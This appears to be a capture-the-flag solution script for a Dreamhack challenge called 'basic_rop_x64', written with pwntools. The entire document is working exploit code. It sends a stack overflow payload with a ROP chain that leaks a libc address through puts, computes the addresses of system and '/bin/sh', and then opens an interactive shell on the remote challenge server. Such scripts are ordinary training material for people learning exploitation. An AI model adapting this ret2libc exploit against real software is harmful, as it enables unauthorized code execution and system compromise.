from pwn import *

context.log_level = 'debug'

def slog(name, address) :
    return success(': '.join([name, hex(address)]))

p = remote('host3.dreamhack.games', 20521)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

ret = 0x4005a9
pop1 = 0x400883
pop2 = 0x400881

read_got = e.got['read']
puts_plt = e.plt['puts']

payload = b'A' * 0x48
payload += p64(ret)
# puts(read_got) -> return to <main>
payload += p64(pop1)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(e.symbols['main'])

p.send(payload)
p.recvn(0x40)
read = u64(p.recvn(6) + b'\x00' * 2)
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
binsh = libc_base + 0x1d8698

slog('libc base', libc_base)
slog('read', read)
slog('system', system)
slog('/bin/sh', binsh)

payload = b'A' * 0x48
payload += p64(pop1)
payload += p64(binsh)
payload += p64(system)

p.send(payload)
p.interactive()